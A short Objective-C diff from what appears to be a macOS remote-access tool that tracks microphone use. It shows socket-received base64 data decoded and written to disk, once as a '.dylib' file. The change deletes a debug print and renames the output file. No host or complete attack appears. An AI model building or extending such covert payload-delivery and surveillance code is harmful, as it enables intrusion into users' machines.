@@ -8,7 +8,6 @@
 BOOL micinuse;
 
 -(id)init {
-    printf("we are fucking initialized %s\n",[_skey UTF8String]);
     fileManager = [[NSFileManager alloc] init];
     return self;
 }
@@ -473,7 +472,7 @@ int sockfd;
             b64data = [b64data stringByReplacingOccurrencesOfString:@"DONEEOF" withString:@""];
             //get data
             NSData *mydata = [[NSData alloc] initWithBase64EncodedString:b64data options: NSDataBase64DecodingIgnoreUnknownCharacters];
-            [mydata writeToFile:@"/Users/lucasjackson/Downloads/pleasework.dylib" atomically:true];
+            [mydata writeToFile:@"unfinished.txt" atomically:true];
             //exit while loop
             return;
         }
